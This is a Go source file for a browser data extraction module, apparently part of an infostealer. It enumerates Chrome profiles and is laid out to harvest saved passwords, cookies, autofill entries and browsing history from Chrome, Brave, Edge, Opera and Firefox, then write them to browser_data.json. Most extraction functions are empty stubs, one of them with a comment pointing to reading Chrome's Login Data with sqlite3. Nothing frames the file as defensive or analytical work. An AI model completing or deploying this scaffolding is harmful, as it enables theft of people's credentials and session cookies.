// ============================================================
// browsers.go - Browser Data Extraction
// ============================================================
package browsers

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"strings"
)

type BrowserData struct {
	Name     string          `json:"name"`
	Profiles []BrowserProfile `json:"profiles"`
}

type BrowserProfile struct {
	Name      string          `json:"name"`
	Passwords []PasswordEntry `json:"passwords"`
	Cookies   []CookieEntry   `json:"cookies"`
	Autofill  []AutofillEntry `json:"autofill"`
	History   []HistoryEntry  `json:"history"`
}

type PasswordEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type CookieEntry struct {
	Host   string `json:"host"`
	Name   string `json:"name"`
	Value  string `json:"value"`
	Path   string `json:"path"`
	Expiry int64  `json:"expiry"`
}

type AutofillEntry struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type HistoryEntry struct {
	URL   string `json:"url"`
	Title string `json:"title"`
	Count int    `json:"count"`
}

// Run starts browser extraction
func Run() {
	log.Println("🌐 Extracting browser data...")
	
	browsers := getBrowsers()
	var allData []BrowserData
	
	for _, browser := range browsers {
		log.Printf("📂 Processing: %s", browser)
		data := extractBrowser(browser)
		if data != nil {
			allData = append(allData, *data)
		}
	}
	
	saveBrowserData(allData)
}

// getBrowsers returns list of browser names
func getBrowsers() []string {
	if isWindows() {
		return []string{"Chrome", "Brave", "Edge", "Opera", "Firefox"}
	}
	return []string{"Chrome", "Firefox"}
}

// extractBrowser extracts data from a specific browser
func extractBrowser(name string) *BrowserData {
	switch name {
	case "Chrome":
		return extractChrome()
	case "Brave":
		return extractBrave()
	case "Edge":
		return extractEdge()
	case "Opera":
		return extractOpera()
	case "Firefox":
		return extractFirefox()
	default:
		return nil
	}
}

// extractChrome extracts data from Chrome
func extractChrome() *BrowserData {
	data := &BrowserData{
		Name: "Chrome",
	}
	
	chromePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
	
	profiles := []string{"Default"}
	if entries, err := os.ReadDir(chromePath); err == nil {
		for _, entry := range entries {
			if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
				profiles = append(profiles, entry.Name())
			}
		}
	}
	
	for _, profile := range profiles {
		profileData := BrowserProfile{Name: profile}
		
		passwords := extractChromePasswords(chromePath, profile)
		profileData.Passwords = passwords
		
		cookies := extractChromeCookies(chromePath, profile)
		profileData.Cookies = cookies
		
		autofill := extractChromeAutofill(chromePath, profile)
		profileData.Autofill = autofill
		
		history := extractChromeHistory(chromePath, profile)
		profileData.History = history
		
		data.Profiles = append(data.Profiles, profileData)
		
		log.Printf("✅ Chrome %s: %d passwords, %d cookies, %d autofill, %d history",
			profile, len(passwords), len(cookies), len(autofill), len(history))
	}
	
	return data
}

// extractChromePasswords extracts passwords from Chrome
func extractChromePasswords(chromePath, profile string) []PasswordEntry {
	var passwords []PasswordEntry
	// In production, use sqlite3 to read Login Data
	return passwords
}

// extractChromeCookies extracts cookies from Chrome
func extractChromeCookies(chromePath, profile string) []CookieEntry {
	var cookies []CookieEntry
	return cookies
}

// extractChromeAutofill extracts autofill data from Chrome
func extractChromeAutofill(chromePath, profile string) []AutofillEntry {
	var autofill []AutofillEntry
	return autofill
}

// extractChromeHistory extracts history from Chrome
func extractChromeHistory(chromePath, profile string) []HistoryEntry {
	var history []HistoryEntry
	return history
}

// extractBrave extracts data from Brave
func extractBrave() *BrowserData {
	return nil
}

// extractEdge extracts data from Edge
func extractEdge() *BrowserData {
	return nil
}

// extractOpera extracts data from Opera
func extractOpera() *BrowserData {
	return nil
}

// extractFirefox extracts data from Firefox
func extractFirefox() *BrowserData {
	return nil
}

// saveBrowserData saves browser data to file
func saveBrowserData(data []BrowserData) {
	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal browser data: %v", err)
		return
	}
	
	if err := os.WriteFile("browser_data.json", jsonData, 0644); err != nil {
		log.Printf("❌ Failed to save browser data: %v", err)
		return
	}
	
	log.Printf("✅ Browser data saved to browser_data.json")
}

// isWindows returns true if running on Windows
func isWindows() bool {
	return os.PathSeparator == '\\'
}